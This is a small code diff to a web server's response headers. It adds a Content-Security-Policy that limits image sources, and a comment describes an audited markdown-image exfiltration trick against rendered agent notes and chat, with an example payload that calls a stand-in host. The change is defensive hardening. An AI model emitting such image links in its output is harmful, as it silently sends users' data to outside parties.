@@ -389,6 +389,10 @@ def _index_response(index_file: Path):
         'Cache-Control': 'no-store, must-revalidate',
         'X-Content-Type-Options': 'nosniff',
         'Referrer-Policy': 'same-origin',
+        # A picture in rendered markdown is a request the owner never chose to make, and agent notes,
+        # reports and chat all render markdown: `![](https://x.example/?d=<data>)` carried data out
+        # when the card opened (audit 2026-10-14). Pictures only - no default-src, so nothing else moves.
+        'Content-Security-Policy': "img-src 'self' data: blob:",
         'X-Frame-Options': 'DENY'})
 
 
